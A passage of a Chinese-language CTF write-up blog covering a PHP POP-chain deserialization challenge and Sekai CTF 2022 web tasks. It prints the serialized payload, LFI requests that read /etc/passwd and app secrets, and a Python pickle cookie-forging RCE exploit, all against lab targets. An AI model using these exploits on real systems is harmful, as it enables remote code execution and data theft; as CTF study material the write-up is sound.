<span class="string">&quot;CTFers&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__invoke</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">     //<span class="title">__invoke</span>(<span class="params"></span>)，当脚本尝试将对象调用为函数时触发</span></span><br><span class="line"><span class="function">   //所以在<span class="title">Start</span>类中的[$<span class="title">this</span>-&gt;<span class="title">func</span>)(<span class="params"></span>)</span>;]中，需要把func值赋值为Sec，从而把其当作函数执行时，从而触其魔术方法</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="title function_ invoke__">file_get_contents</span>(<span class="string">&#x27;/flag&#x27;</span>);</span><br><span class="line">      <span class="comment">//这里就是目标，执行文件包含flag输出内容</span></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p><code>Easy</code></p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Easy</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$cla</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__call</span>(<span class="params"><span class="variable">$fun</span>, <span class="variable">$var</span></span>)</span></span><br><span class="line"><span class="function">   //<span class="title">__call</span>(<span class="params"></span>)，在对象上下文中调用不可访问的方法时触发</span></span><br><span class="line"><span class="function">   //所以在<span class="title">Sec</span>类中，当<span class="title">this</span>-&gt;<span class="title">obj</span>赋值为<span class="title">Easy</span>类时，调用<span class="title">check</span>方法时，就会触发，因为<span class="title">Easy</span>里没有<span class="title">check</span>函数</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;cla = <span class="keyword">clone</span> <span class="variable">$var</span>[<span class="number">0</span>];</span><br><span class="line">        <span class="comment">//这里调用clone，当对象完成复制时会执行eeee里的__clone</span></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p><code>eeee</code></p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">eeee</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$obj</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__clone</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable language_">$this</span>-&gt;obj-&gt;cmd))&#123;</span><br><span class="line">            <span class="comment">//这里是对$this-&gt;obj的cmd属性使用isset函数，但是并不存在cmd属性</span></span><br><span class="line">            <span class="comment">//所以把this-&gt;obj赋值为Strat类名，从而触发__isset</span></span><br><span class="line">            <span class="keyword">echo</span> <span class="string">&quot;success&quot;</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>



<p>整理一下</p>
<figure class="highlight zephir"><table><tr><td class="code"><pre><span class="line">Start::__destruct</span><br><span class="line"></span><br><span class="line">==&gt;</span><br><span class="line"></span><br><span class="line">Sec::__toString</span><br><span class="line"></span><br><span class="line">==&gt;</span><br><span class="line"></span><br><span class="line">Easy::__call</span><br><span class="line"></span><br><span class="line">==&gt;</span><br><span class="line"></span><br><span class="line">eeee::__clone</span><br><span class="line"></span><br><span class="line">==&gt;</span><br><span class="line"></span><br><span class="line">Start::__isset</span><br><span class="line"></span><br><span class="line">==&gt;</span><br><span class="line"></span><br><span class="line">Sec::__invoke</span><br></pre></td></tr></table></figure>

<p>于是<code>payload</code>为</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);</span><br><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="comment">#Something useful for you : https://zhuanlan.zhihu.com/p/377676274</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Start</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$name</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$func</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Sec</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$obj</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$var</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Easy</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$cla</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">eeee</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$obj</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="variable">$start</span>=<span class="keyword">new</span> <span class="title class_">Start</span>();</span><br><span class="line"><span class="variable">$sec</span>=<span class="keyword">new</span> <span class="title class_">Sec</span>();</span><br><span class="line"><span class="variable">$easy</span>=<span class="keyword">new</span> <span class="title class_">Easy</span>();</span><br><span class="line"><span class="variable">$eeee</span>=<span class="keyword">new</span> <span class="title function_ invoke__">eeee</span>();</span><br><span class="line"></span><br><span class="line"><span class="variable">$start</span>-&gt;name=<span class="variable">$sec</span>;</span><br><span class="line"><span class="variable">$start</span>-&gt;func=<span class="variable">$sec</span>;</span><br><span class="line"></span><br><span class="line"><span class="variable">$sec</span>-&gt;obj=<span class="variable">$easy</span>;</span><br><span class="line"><span class="variable">$sec</span>-&gt;<span class="keyword">var</span>=<span class="variable">$eeee</span>;</span><br><span class="line"></span><br><span class="line"><span class="variable">$eeee</span>-&gt;obj=<span class="variable">$start</span>;</span><br><span class="line"><span class="comment">//因为这里把eeee里的变量复制为实例化的Start的类，所以如果从eeee类为开始序列化的入口也是可以的</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">echo</span> <span class="title function_ invoke__">serialize</span>(<span class="variable">$start</span>);</span><br><span class="line"><span class="comment">//echo serialize($eeee);</span></span><br></pre></td></tr></table></figure>

<p>得到序列化数据，<code>post</code>传入就行</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">O:<span class="number">5</span>:<span class="string">&quot;Start&quot;</span>:<span class="number">2</span>:&#123;s:<span class="number">4</span>:<span class="string">&quot;name&quot;</span>;O:<span class="number">3</span>:<span class="string">&quot;Sec&quot;</span>:<span class="number">2</span>:&#123;s:<span class="number">3</span>:<span class="string">&quot;obj&quot;</span>;O:<span class="number">4</span>:<span class="string">&quot;Easy&quot;</span>:<span class="number">1</span>:&#123;s:<span class="number">3</span>:<span class="string">&quot;cla&quot;</span>;N;&#125;s:<span class="number">3</span>:<span class="string">&quot;var&quot;</span>;O:<span class="number">4</span>:<span class="string">&quot;eeee&quot;</span>:<span class="number">1</span>:&#123;s:<span class="number">3</span>:<span class="string">&quot;obj&quot;</span>;r:<span class="number">1</span>;&#125;&#125;s:<span class="number">4</span>:<span class="string">&quot;func&quot;</span>;r:<span class="number">2</span>;&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">//O:4:&quot;eeee&quot;:1:&#123;s:3:&quot;obj&quot;;O:5:&quot;Start&quot;:2:&#123;s:4:&quot;name&quot;;O:3:&quot;Sec&quot;:2:&#123;s:3:&quot;obj&quot;;O:4:&quot;Easy&quot;:1:&#123;s:3:&quot;cla&quot;;N;&#125;s:3:&quot;var&quot;;r:1;&#125;s:4:&quot;func&quot;;r:3;&#125;&#125;</span></span><br></pre></td></tr></table></figure>

<p><img src="/2022/06/26/Game-wp/image-20221027162117156.png" alt="image-20221027162117156"></p>
<hr>
<h1 id="Sekai-CTF"><a href="#Sekai-CTF" class="headerlink" title="Sekai CTF"></a>Sekai CTF</h1><p><a href="https://github.com/project-sekai-ctf/sekaictf-2022">https://github.com/project-sekai-ctf/sekaictf-2022</a></p>
<p>这是官方的<code>wp</code>和题目的<code>docker</code>，我后面还是把<code>web</code>都复现一下</p>
<p><img src="/2022/06/26/Game-wp/image-20221003101420158.png" alt="image-20221003101420158"></p>
<p><code>大比赛，每个题要么难出头，要么感觉就差一点，与大佬的差距，鼠鼠只能赛后复现wp了</code></p>
<p><img src="/2022/06/26/Game-wp/image-20221003104433566.png" alt="image-20221003104433566"></p>
<p><code>这是web难度【看起来就是按解题人数来分】</code></p>
<h2 id="1-bottle-poem-后续学习了，补上自己的思路"><a href="#1-bottle-poem-后续学习了，补上自己的思路" class="headerlink" title="1.bottle-poem[后续学习了，补上自己的思路]"></a>1.bottle-poem[后续学习了，补上自己的思路]</h2><figure class="highlight pgsql"><table><tr><td class="code"><pre><span class="line">hint：</span><br><span class="line"></span><br><span class="line">Come <span class="keyword">and</span> <span class="keyword">read</span> poems <span class="keyword">in</span> the bottle.</span><br><span class="line"></span><br><span class="line"><span class="keyword">No</span> bruteforcing <span class="keyword">is</span> required <span class="keyword">to</span> solve this challenge. Please <span class="keyword">do</span> <span class="keyword">not</span> use scanner tools. Rate limiting <span class="keyword">is</span> applied. Flag <span class="keyword">is</span> executable <span class="keyword">on</span> <span class="keyword">server</span>.</span><br><span class="line"></span><br><span class="line">翻译：</span><br><span class="line"></span><br><span class="line">快来读一读瓶中的诗吧。</span><br><span class="line"></span><br><span class="line">解决这一挑战不需要暴力破解。请不要使用扫描仪工具。应用速率限制。标志在服务器上是可执行的。</span><br></pre></td></tr></table></figure>

<p>这道题我已经秃头了，开始觉得是单纯的文件包含，但是后面看到官方发的wp，感觉又没那么简单</p>
<p>我先直接展示官方的wp，然后再展示我复现的过程</p>
<figure class="highlight tcl"><table><tr><td class="code"><pre><span class="line">Hey guys Thx <span class="keyword">for</span> attending SekaiCTF  i made two challenges <span class="keyword">for</span> this competition one is bottle poem another is sekaigame start</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> the bottle poem most of people think its guessy and at the start the challenge always down  so say sorry to u and respect to my buddy hfz that he fix this challenge </span><br><span class="line"></span><br><span class="line">here is my short wp</span><br><span class="line">-----------------</span><br><span class="line">it&#x27;s easy to find that this website has LFI</span><br><span class="line">u wanna to  <span class="keyword">read</span> <span class="keyword">file</span> directly but failed </span><br><span class="line">that&#x27;s not show u that we hide it  that means u havent enough execute permission to <span class="keyword">read</span> it (so we <span class="keyword">update</span> description that flag is executable and u dont need some bruteforcing or guessing)flag is in the common path /flag</span><br><span class="line"></span><br><span class="line">so we need to <span class="keyword">read</span> <span class="keyword">source</span></span><br><span class="line">just like this</span><br><span class="line"></span><br><span class="line"><span class="keyword">http</span>://bottle-poem.ctf.sekai.team/show?id=/<span class="keyword">proc</span>/self/cwd/app.py<span class="title"></span></span><br><span class="line"><span class="title"></span></span><br><span class="line"><span class="title">so</span> dont<span class="title"> need</span> to<span class="title"> bruteforce</span> <span class="keyword">proc</span>/self/<span class="title"> just</span> use<span class="title"> it</span> to<span class="title"> got</span> sourcecode<span class="title"></span></span><br><span class="line"><span class="title"></span></span><br><span class="line"><span class="title">use</span> this<span class="title"> way</span> u<span class="title"> can</span> read<span class="title"> the</span> secret --sekai<span class="title"></span></span><br><span class="line"><span class="title"></span></span><br><span class="line"><span class="title">http://bottle-poem.ctf.sekai.team/show?id=/proc/self/cwd/config/secret.py</span></span><br><span class="line"><span class="title"></span></span><br><span class="line"><span class="title">now</span> u<span class="title"> can</span> control<span class="title"> the</span> cookies<span class="title"> but</span> if<span class="title"> u</span> read<span class="title"> something</span> just<span class="title"> like</span> /views/admin.html<span class="title"> or</span> just<span class="title"> make</span> guest<span class="title"> to</span> admin<span class="title"> u</span> would<span class="title"> find</span> its<span class="title"> a</span> troll<span class="title"> </span></span><br><span class="line"><span class="title"></span></span><br><span class="line"><span class="title">so</span> u<span class="title"> need</span> rce<span class="title"> truely</span> if<span class="title"> u</span> search<span class="title"> some</span> documentation<span class="title"> will</span> find<span class="title"> the</span> bottle&#x27;s<span class="title"> cookie_decode()</span> will<span class="title"> unpickle</span> so<span class="title"> use</span> this<span class="title"> to</span> get<span class="title"> rce</span></span><br><span class="line">https://github.com/bottlepy/bottle/issues/900<span class="title"></span></span><br><span class="line"><span class="title"></span></span><br><span class="line"><span class="title">here</span> the<span class="title"> steps</span></span><br><span class="line">1.lfi<span class="title"> to</span> read<span class="title"> file</span> and<span class="title">    secret</span></span><br><span class="line">2.use<span class="title"> cookie</span> pickle<span class="title"> rce</span> to<span class="title"> reverse</span> a<span class="title"> shell</span></span><br><span class="line">3.execute /flag<span class="title"> to</span> get<span class="title"> flag</span></span><br><span class="line">---------<span class="title"></span></span><br><span class="line"><span class="title">and</span> my<span class="title"> exp</span> </span><br><span class="line">-------------<span class="title"></span></span><br><span class="line"><span class="title">demo</span> exp<span class="title"></span></span><br><span class="line"><span class="title">import</span> base64,hashlib,pickle,hmac<span class="title"></span></span><br><span class="line"><span class="title">import</span> os<span class="title"></span></span><br><span class="line"><span class="title">def</span> tob(s,<span class="title"> enc=&#x27;utf8&#x27;):</span></span><br><span class="line"><span class="title">    if</span> isinstance(s,<span class="title"> str):</span></span><br><span class="line"><span class="title">        return</span> s.encode(enc)<span class="title"></span></span><br><span class="line"><span class="title">    return</span> b&#x27;&#x27;<span class="title"> if</span> s<span class="title"> is</span> None<span class="title"> else</span> bytes(s)<span class="title"></span></span><br><span class="line"><span class="title"></span></span><br><span class="line"><span class="title"></span></span><br><span class="line"><span class="title">def</span> cookie_encode(data,<span class="title"> key):</span></span><br><span class="line">    &#x27;&#x27;&#x27;<span class="title"> Encode</span> and<span class="title"> sign</span> a<span class="title"> pickle-able</span> object.<span class="title"> Return</span> a (byte)<span class="title"> string</span> &#x27;&#x27;&#x27;<span class="title"></span></span><br><span class="line"><span class="title">    msg</span> =<span class="title"> base64.b64encode(pickle.dumps(data,</span> 0))<span class="title"></span></span><br><span class="line"><span class="title">    sig</span> =<span class="title"> base64.b64encode(hmac.new(tob(key),</span> msg,<span class="title"> digestmod=hashlib.md5).digest())</span></span><br><span class="line"><span class="title">    return</span> tob(&#x27;!&#x27;) +<span class="title"> sig</span> +<span class="title"> tob(&#x27;?&#x27;)</span> +<span class="title"> msg</span></span><br><span class="line"><span class="title"></span></span><br><span class="line"><span class="title">class</span> test():<span class="title"></span></span><br><span class="line"><span class="title">    def</span> __reduce__(self):<span class="title"></span></span><br><span class="line"><span class="title">        return</span> (eval,(&#x27;__import__(&quot;os&quot;).popen(&quot;command&quot;)&#x27;,))<span class="title"></span></span><br><span class="line"><span class="title"></span></span><br><span class="line"><span class="title"></span></span><br><span class="line"><span class="title">obj</span> =<span class="title"> test()</span></span><br><span class="line">a =<span class="title"> cookie_encode(obj,&#x27;Se3333KKKKKKAAAAIIIIILLLLovVVVVV3333YYYYoooouuu&#x27;)</span></span><br><span class="line">print(a)</span><br></pre></td></tr></table></figure>

<p>翻译</p>
<figure class="highlight awk"><table><tr><td class="code"><pre><span class="line">大家好，感谢参加 SekaiCTF 我为这次比赛提出了两个挑战，一个是瓶子诗，另一个是 sekaigame start</span><br><span class="line"></span><br><span class="line">对于瓶子诗，大多数人认为它是猜测性的，一开始挑战总是失败，所以向你说声抱歉，并尊重我的好友 hfz，他解决了这个挑战</span><br><span class="line"></span><br><span class="line">这是我的简短 wp</span><br><span class="line">-----------------</span><br><span class="line">很容易发现这个网站有LFI（本地文件包含）</span><br><span class="line">你想直接读取文件但失败了</span><br><span class="line">这并没有告诉你我们隐藏它，这意味着你没有足够的执行权限来读取它（所以我们更新了标志是可执行的并且你不需要一些暴力破解或猜测的描述）标志在公共路径/标志中</span><br><span class="line"></span><br><span class="line">所以我们需要阅读源码</span><br><span class="line">像这样</span><br><span class="line"></span><br><span class="line">http:<span class="regexp">//</span>bottle-poem.ctf.sekai.team<span class="regexp">/show?id=/</span>proc<span class="regexp">/self/</span>cwd/app.py</span><br><span class="line"></span><br><span class="line">所以不需要蛮力 proc<span class="regexp">/self/</span> 只需使用它来获取源代码</span><br><span class="line"></span><br><span class="line">使用这种方式你可以阅读秘密--sekai</span><br><span class="line"></span><br><span class="line">http:<span class="regexp">//</span>bottle-poem.ctf.sekai.team<span class="regexp">/show?id=/</span>proc<span class="regexp">/self/</span>cwd<span class="regexp">/config/</span>secret.py</span><br><span class="line"></span><br><span class="line">现在您可以控制 cookie，但如果您阅读 <span class="regexp">/views/</span>admin.html 之类的内容，或者只是让访客成为管理员，您会发现它是一个巨魔（可以理解为恶搞）</span><br><span class="line"></span><br><span class="line">所以你真的需要 rce 如果你搜索一些文档会发现瓶子的 cookie_decode() 会解开所以用它来获取 rce</span><br><span class="line">https:<span class="regexp">//gi</span>thub.com<span class="regexp">/bottlepy/</span>bottle<span class="regexp">/issues/</span><span class="number">900</span></span><br><span class="line"></span><br><span class="line">这里的步骤</span><br><span class="line"><span class="number">1</span>.lfi读取文件和秘密</span><br><span class="line"><span class="number">2</span>.使用cookie pickle rce 反弹一个shell</span><br><span class="line"><span class="number">3</span>.执行/flag获取flag</span><br></pre></td></tr></table></figure>

<p>官方<code>exp</code></p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">demo exp</span><br><span class="line"><span class="keyword">import</span> base64,hashlib,pickle,hmac</span><br><span class="line"><span class="keyword">import</span> os</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">tob</span>(<span class="params">s, enc=<span class="string">&#x27;utf8&#x27;</span></span>):</span><br><span class="line">    <span class="keyword">if</span> <span class="built_in">isinstance</span>(s, <span class="built_in">str</span>):</span><br><span class="line">        <span class="keyword">return</span> s.encode(enc)</span><br><span class="line">    <span class="keyword">return</span> <span class="string">b&#x27;&#x27;</span> <span class="keyword">if</span> s <span class="keyword">is</span> <span class="literal">None</span> <span class="keyword">else</span> <span class="built_in">bytes</span>(s)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">cookie_encode</span>(<span class="params">data, key</span>):</span><br><span class="line">    <span class="string">&#x27;&#x27;&#x27; Encode and sign a pickle-able object. Return a (byte) string &#x27;&#x27;&#x27;</span></span><br><span class="line">    msg = base64.b64encode(pickle.dumps(data, <span class="number">0</span>))</span><br><span class="line">    sig = base64.b64encode(hmac.new(tob(key), msg, digestmod=hashlib.md5).digest())</span><br><span class="line">    <span class="keyword">return</span> tob(<span class="string">&#x27;!&#x27;</span>) + sig + tob(<span class="string">&#x27;?&#x27;</span>) + msg</span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">test</span>():</span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">__reduce__</span>(<span class="params">self</span>):</span><br><span class="line">        <span class="keyword">return</span> (<span class="built_in">eval</span>,(<span class="string">&#x27;__import__(&quot;os&quot;).popen(&quot;command&quot;)&#x27;</span>,))</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">obj = test()</span><br><span class="line">a = cookie_encode(obj,<span class="string">&#x27;Se3333KKKKKKAAAAIIIIILLLLovVVVVV3333YYYYoooouuu&#x27;</span>)</span><br><span class="line"><span class="built_in">print</span>(a)</span><br></pre></td></tr></table></figure>

<hr>
<p>下面是我复现理解操作</p>
<p>先打开网站，看到有三个可以打开的链接</p>
<p><img src="/2022/06/26/Game-wp/image-20221003201506807.png" alt="image-20221003201506807"></p>
<p>先看看源码</p>
<p><img src="/2022/06/26/Game-wp/image-20221003201547093.png" alt="image-20221003201547093"></p>
<p>发现没什么额外的信息，三个链接是对应着三个文本文件</p>
<p>看起来似乎是文件包含的题</p>
<figure class="highlight awk"><table><tr><td class="code"><pre><span class="line">http:<span class="regexp">//</span>bottle-poem.ctf.sekai.team/show?id=spring.txt</span><br></pre></td></tr></table></figure>

<p><img src="/2022/06/26/Game-wp/image-20221003202543907.png" alt="image-20221003202543907"></p>
<p>我们试试能不能显示其他信息，我在做的时候试的是<code>/etc/passwd</code></p>
<figure class="highlight awk"><table><tr><td class="code"><pre><span class="line">http:<span class="regexp">//</span>bottle-poem.ctf.sekai.team<span class="regexp">/show?id=/</span>etc/passwd</span><br></pre></td></tr></table></figure>

<p><img src="/2022/06/26/Game-wp/image-20221003202814644.png" alt="image-20221003202814644"></p>
<p>看来是方向对了，确实是可以包含本地文件并显示，但是没有其他信息能利用</p>
<h3 id="查看当前进程的启动命令"><a href="#查看当前进程的启动命令" class="headerlink" title="*查看当前进程的启动命令"></a>*查看当前进程的启动命令</h3><p>这个是看最后发的<code>wp</code>，学到了</p>
<figure class="highlight awk"><table><tr><td class="code"><pre><span class="line"><span class="regexp">/proc/</span>self/cmdline</span><br><span class="line"></span><br><span class="line"><span class="regexp">//</span>该文件包含的是该进程的命令行参数，包括进程的启动路径(argv[<span class="number">0</span>])</span><br></pre></td></tr></table></figure>

<p>然后会下载一个名叫<code>show</code>的文件</p>
<figure class="highlight awk"><table><tr><td class="code"><pre><span class="line">python3 -u <span class="regexp">/app/</span>app.py </span><br></pre></td></tr></table></figure>

<p>在命令中，我们发现运行了一个<code>/app/app.py</code>的文件</p>
<p>看来这就是我们网站启动的脚本，里面就有我们网站的源码</p>
<figure class="highlight awk"><table><tr><td class="code"><pre><span class="line">http:<span class="regexp">//</span>bottle-poem.ctf.sekai.team<span class="regexp">/show?id=/</span>app/app.py</span><br></pre></td></tr></table></figure>

<p>查看到文件源码</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> bottle <span class="keyword">import</span> route, run, template, request, response, error</span><br><span class="line"><span class="keyword">from</span> config.secret <span class="keyword">import</span> sekai</span><br><span class="line"><span class="keyword">import</span> os</span><br><span class="line"><span class="keyword">import</span> re</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="meta">@route(<span class="params"><span class="string">&quot;/&quot;</span></span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">home</span>():</span><br><span class="line">    <span class="keyword">return</span> template(<span class="string">&quot;index&quot;</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="meta">@route(<span class="params"><span class="string">&quot;/show&quot;</span></span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">index</span>():</span><br><span class="line">    response.content_type = <span class="string">&quot;text/plain; charset=UTF-8&quot;</span></span><br><span class="line">    param = request.query.<span class="built_in">id</span></span><br><span class="line">    <span class="keyword">if</span> re.search(<span class="string">&quot;^../app&quot;</span>, param):</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&quot;No!!!!&quot;</span></span><br><span class="line">    requested_path = os.path.join(os.getcwd() + <span class="string">&quot;/poems&quot;</span>, param)</span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        <span class="keyword">with</span> <span class="built_in">open</span>(requested_path) <span class="keyword">as</span> f:</span><br><span class="line">            tfile = f.read()</span><br><span class="line">    <span class="keyword">except</span> Exception <span class="keyword">as</span> e:</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&quot;No This Poems&quot;</span></span><br><span class="line">    <span class="keyword">return</span> tfile</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="meta">@error(<span class="params"><span class="number">404</span></span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">error404</span>(<span class="params">error</span>):</span><br><span class="line">    <span class="keyword">return</span> template(<span class="string">&quot;error&quot;</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="meta">@route(<span class="params"><span class="string">&quot;/sign&quot;</span></span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">index</span>():</span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        session = request.get_cookie(<span class="string">&quot;name&quot;</span>, secret=sekai)</span><br><span class="line">        <span class="keyword">if</span> <span class="keyword">not</span> session <span class="keyword">or</span> session[<span class="string">&quot;name&quot;</span>] == <span class="string">&quot;guest&quot;</span>:</span><br><span class="line">            session = &#123;<span class="string">&quot;name&quot;</span>: <span class="string">&quot;guest&quot;</span>&#125;</span><br><span class="line">            response.set_cookie(<span class="string">&quot;name&quot;</span>, session, secret=sekai)</span><br><span class="line">            <span class="keyword">return</span> template(<span class="string">&quot;guest&quot;</span>, name=session[<span class="string">&quot;name&quot;</span>])</span><br><span class="line">        <span class="keyword">if</span> session[<span class="string">&quot;name&quot;</span>] == <span class="string">&quot;admin&quot;</span>:</span><br><span class="line">            <span class="keyword">return</span> template(<span class="string">&quot;admin&quot;</span>, name=session[<span class="string">&quot;name&quot;</span>])</span><br><span class="line">    <span class="keyword">except</span>:</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&quot;pls no hax&quot;</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&quot;__main__&quot;</span>:</span><br><span class="line">    os.chdir(os.path.dirname(__file__))</span><br><span class="line">    run(host=<span class="string">&quot;0.0.0.0&quot;</span>, port=<span class="number">8080</span>)</span><br></pre></td></tr></table></figure>

<p>在</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> config.secret <span class="keyword">import</span> sekai</span><br></pre></td></tr></table></figure>

<p>看到<code>config.secret</code>，这是个文件路径<code>/config/secret</code></p>
<p>我们可以访问看看，能不能看到里面的内容【注意这个文件肯定是在 <code>/app</code>目录下】</p>
<figure class="highlight awk"><table><tr><td class="code"><pre><span class="line">http:<span class="regexp">//</span>bottle-poem.ctf.sekai.team<span class="regexp">/show?id=/</span>app<span class="regexp">/config/</span>secret.py</span><br></pre></td></tr></table></figure>

<p>得到</p>
<figure class="highlight abnf"><table><tr><td class="code"><pre><span class="line"><span class="attribute">sekai</span> <span class="operator">=</span> <span class="string">&quot;Se3333KKKKKKAAAAIIIIILLLLovVVVVV3333YYYYoooouuu&quot;</span></span><br></pre></td></tr></table></figure>



<hr>
<figure class="highlight markdown"><table><tr><td class="code"><pre><span class="line"><span class="bullet">1.</span> lfi 读取文件和秘密</span><br><span class="line"><span class="bullet">2.</span> 使用 cookie pickle rce 反弹shell</span><br><span class="line"><span class="bullet">3.</span> 执行./flag获取flag</span><br></pre></td></tr></table></figure>

<p>根据官方的<code>pickle rce</code>，这个涉及新的 <code>pickle</code> 反序列化技巧</p>
<p>【流下没技术的眼泪】可我现在只会<code>php</code>反序列化，后面补上</p>
<hr>
<h2 id="2-sekai-game-start"><a href="#2-sekai-game-start" class="headerlink" title="2.sekai-game-start"></a>2.sekai-game-start</h2><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">include</span>(<span class="string">&#x27;./flag.php&#x27;</span>);</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Sekai_Game</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$start</span> = True;  </span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">if</span>(<span class="variable language_">$this</span>-&gt;start === True)&#123;</span><br><span class="line">            <span class="keyword">echo</span> <span class="string">&quot;Sekai Game Start Here is your flag &quot;</span>.<span class="title function_ invoke__">getenv</span>(<span class="string">&#x27;FLAG&#x27;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__wakeup</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;start=False;    </span><br><span class="line"> </span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;sekai_game.run&#x27;</span>]))&#123;</span><br><span class="line">    <span class="title function_ invoke__">unserialize</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;sekai_game.run&#x27;</span>]);</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<p>看起来是到<code>反序列化</code>的题目，看起来似乎难度不大，但是我被瓶子诗卡了太久，这几天又在搞<code>DC5</code>，后面的题目发布出来都没怎么看了，早知道做一下了<code>【哭唧唧】</code></p>
<p>我们先简单的分析一下源码内容</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">include</span>(<span class="string">&#x27;./flag.php&#x27;</span>);    <span class="comment">//文件包含，把当前目录flag.php文件</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Sekai_Game</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$start</span> = True;<span class="comment">//给strat变量赋值为True</span></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">if</span>(<span class="variable language_">$this</span>-&gt;start === True)&#123;</span><br><span class="line">            <span class="keyword">echo</span> <span class="string">&quot;Sekai Game Start Here is your flag &quot;</span>.<span class="title function_ invoke__">getenv</span>(<span class="string">&#x27;FLAG&#x27;</span>);</span><br><span class="line">            <span class="comment">//getenv函数 用来获取php 